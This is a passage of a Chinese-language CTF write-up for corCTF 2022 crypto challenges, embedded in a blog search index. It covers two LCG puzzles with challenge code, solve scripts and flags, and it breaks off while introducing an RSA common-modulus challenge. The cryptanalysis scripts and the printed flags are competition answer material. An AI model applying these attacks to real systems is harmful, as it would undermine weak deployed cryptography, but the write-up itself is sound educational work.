<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>corCTF 2022</title>
    <link href="/2022/08/08/corCTF-2022/"/>
    <url>/2022/08/08/corCTF-2022/</url>
    
    <content type="html"><![CDATA[<p>corCTF 2022, 写了两道简单的密码学</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="tadpole"><a class="markdownIt-Anchor" href="#tadpole"></a> <strong>tadpole</strong></h2><figure class="highlight vim"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs vim">tadpoles <span class="hljs-keyword">only</span> know the alphabet <span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">b</span>... how will they ever know what <span class="hljs-keyword">p</span> <span class="hljs-keyword">is</span>?<br></code></pre></td></tr></table></figure><p>题目是关于LCG的。给出了代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, isPrime<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> randbelow<br><br>p = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read())<br><span class="hljs-keyword">assert</span> isPrime(p)<br><br>a = randbelow(p)<br>b = randbelow(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> (a * s + b) % p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &quot;</span>, a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b = &quot;</span>, b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;f(31337) = &quot;</span>, f(<span class="hljs-number">31337</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;f(f(31337)) = &quot;</span>, f(f(<span class="hljs-number">31337</span>)))<br><br><span class="hljs-comment"># a =  7904681699700731398014734140051852539595806699214201704996640156917030632322659247608208994194840235514587046537148300460058962186080655943804500265088604049870276334033409850015651340974377752209566343260236095126079946537115705967909011471361527517536608234561184232228641232031445095605905800675590040729</span><br><span class="hljs-comment"># b =  16276123569406561065481657801212560821090379741833362117064628294630146690975007397274564762071994252430611109538448562330994891595998956302505598671868738461167036849263008183930906881997588494441620076078667417828837239330797541019054284027314592321358909551790371565447129285494856611848340083448507929914</span><br><span class="hljs-comment"># f(31337) =  52926479498929750044944450970022719277159248911867759992013481774911823190312079157541825423250020665153531167070545276398175787563829542933394906173782217836783565154742242903537987641141610732290449825336292689379131350316072955262065808081711030055841841406454441280215520187695501682433223390854051207100</span><br><span class="hljs-comment"># f(f(31337)) =  65547980822717919074991147621216627925232640728803041128894527143789172030203362875900831296779973655308791371486165705460914922484808659375299900737148358509883361622225046840011907835671004704947767016613458301891561318029714351016012481309583866288472491239769813776978841785764693181622804797533665463949</span><br></code></pre></td></tr></table></figure><p>LCG的标准格式为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>a</mi><msub><mi>N</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">N_{i + 1} = aN_i + b \space mod \space p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><p>也就是：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>p</mi><mo>=</mo><mi>a</mi><msub><mi>N</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo>−</mo><msub><mi>N</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">kp = aN_i + b - N_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>我们可以得到两个数字：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">k_1p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>k</mi><mn>2</mn></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">k_2p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span></span></span></span>。由于p是一个素数，所以这两个数的gcd即为p。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd,is_prime<br><br>a = ...<br>b = ...<br>f = ... <span class="hljs-comment"># f(31337)</span><br>ff = ... <span class="hljs-comment"># f(f(31337))</span><br><br>k1 = a * <span class="hljs-number">31337</span> + b - f<br>k2 = a * f + b - ff<br><br>p = gcd(k1, k2)<br><span class="hljs-keyword">assert</span> is_prime(p)<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(p)))<br><br><span class="hljs-comment"># b&#x27;corctf&#123;1n_m4th3m4t1c5,_th3_3ucl1d14n_4lg0r1thm_1s_4n_3ff1c13nt_m3th0d_f0r_c0mput1ng_th3_GCD_0f_tw0_1nt3g3rs&#125; &lt;- this is flag adm&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="luckyguess"><a class="markdownIt-Anchor" href="#luckyguess"></a> <strong>luckyguess</strong></h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">i hope you<span class="hljs-symbol">&#x27;re</span> feeling lucky today<br></code></pre></td></tr></table></figure><p>这题也是关于LCG的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python</span><br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits<br><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">521</span> - <span class="hljs-number">1</span><br>a = getrandbits(<span class="hljs-number">521</span>)<br>b = getrandbits(<span class="hljs-number">521</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a =&quot;</span>, a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b =&quot;</span>, b)<br><br><span class="hljs-keyword">try</span>:<br>    x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter your starting point: &quot;</span>))<br>    y = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;alright, what&#x27;s your guess? &quot;</span>))<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;?&quot;</span>)<br>    exit(-<span class="hljs-number">1</span>)<br><br>r = getrandbits(<span class="hljs-number">20</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>    x = (x * a + b) % p<br><br><br><span class="hljs-keyword">if</span> x == y:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wow, you are truly psychic! here, have a flag:&quot;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).read())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sorry, you are not a true psychic... better luck next time&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以看到LCG的三个参数已经给我们了。要求我们给出一个seed，并且给出r轮之后的LCG输出。</p><p>由于r是随机的，而且我们没有办法得到这个r。所以我们将目光放在一些特殊的值上面，比如，一个前后项相同的LCG序列。也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>N</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">N_{i+1}=N_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>由此我们解一个模p剩余系的方程即可得到答案。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo>=</mo><mi>a</mi><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi><mtext>   </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">ax + b = a(ax + b) + b \ \ \ mod \ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sage</span><br><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">521</span> - <span class="hljs-number">1</span><br>a = ...<br>b = ...<br><br>R.&lt;x&gt; = Zmod(p)[]<br>f = (a*x + b) - (a*(a*x + b) + b)<br><span class="hljs-built_in">print</span>(f.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># wow, you are truly psychic! here, have a flag: corctf&#123;r34l_psych1c5_d0nt_n33d_f1x3d_p01nt5_t0_tr1ck_th15_lcg!&#125;</span><br></code></pre></td></tr></table></figure><p>解的值是整个序列的值，以这个值为seed会导出一个所有导出数字都为seed的序列。所以这个值既是我们的起始值也是我们的猜测值。</p><p>但其实好像也不需要这么麻烦。</p><p>我们的目标是找到一个seed是的LCG输出的值不变。那么其实约束可以变为以下形式：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>a</mi><mo>∗</mo><mi>x</mi><mo>+</mo><mi>b</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x  = a*x + b \space mod  \space p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><p>其实也就变成了:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mfrac><mi>b</mi><mrow><mn>1</mn><mo>−</mo><mi>a</mi></mrow></mfrac><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x = \frac{b}{1-a} \space mod \space p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.14077em;vertical-align:-0.7693300000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">a</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">521</span> - <span class="hljs-number">1</span><br><br>sh = remote(<span class="hljs-string">&quot;be.ax&quot;</span>, <span class="hljs-number">31800</span>)<br>sh.recvuntil(<span class="hljs-string">b&quot;a = &quot;</span>)<br>a = <span class="hljs-built_in">int</span>(sh.recvline().strip())<br>sh.recvuntil(<span class="hljs-string">b&quot;b = &quot;</span>)<br>b = <span class="hljs-built_in">int</span>(sh.recvline().strip())<br><br>x = b*inverse(<span class="hljs-number">1</span>-a, p) % p<br><br>sh.sendline(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>sh.sendline(<span class="hljs-built_in">str</span>(x).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-built_in">print</span>(sh.recvline())<br><br>sh.close()<br><span class="hljs-comment"># b&quot;enter your starting point: alright, what&#x27;s your guess? wow, you are truly psychic! here, have a flag: corctf&#123;r34l_psych1c5_d0nt_n33d_f1x3d_p01nt5_t0_tr1ck_th15_lcg!&#125;\n&quot;</span><br></code></pre></td></tr></table></figure><h2 id="hide"><a class="markdownIt-Anchor" href="#hide"></a> <strong>hidE</strong></h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This RSA encryption service <span class="hljs-keyword">is</span> so secure we&#x27;re <span class="hljs-keyword">not</span> even going <span class="hljs-keyword">to</span> <span class="hljs-keyword">tell</span> you how we encrypted <span class="hljs-keyword">it</span><br></code></pre></td></tr></table></figure><p>RSA相关，涉及为随机数和RSA共模攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>).read().encode()<br><br>random.seed(<span class="hljs-built_in">int</span>(time.time()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg</span>):<br>    e = random.randint(<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">while</span> math.gcd(e, phi) != <span class="hljs-number">1</span>:<br>        e = random.randint(<span class="hljs-number">1</span>, n)<br>    pt = bytes_to_long(msg)<br>    ct = <span class="hljs-built_in">pow</span>(pt, e, n)<br>    <span class="hljs-keyword">return</span> binascii.hexlify(long_to_bytes(ct)).decode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Secure Encryption Service&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your modulus is:&#x27;</span>, n)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Options&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;(1) Encrypt flag&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;(2) Encrypt message&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;(3) Quit&#x27;</span>)<br>        x = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Choose an option: &#x27;</span>)<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;123&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Unrecognized option.&#x27;</span>)<br>            exit()<br>        <span class="hljs-keyword">elif</span> x == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Here is your encrypted flag:&#x27;</span>, encrypt(flag))<br>        <span class="hljs-keyword">elif</span> x == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            msg = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your message in hex: &#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Here is your encrypted message:&#x27;</span>, encrypt(binascii.unhexlify(msg)))<br>        <span class="hljs-keyword">elif</span> x == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye&#x27;</span>)<br>            exit()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>从运行脚本中我们可以看到，加密使用的所有e都是随机生成的。而且我们可以加密自己的数据，并且没有次数的限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 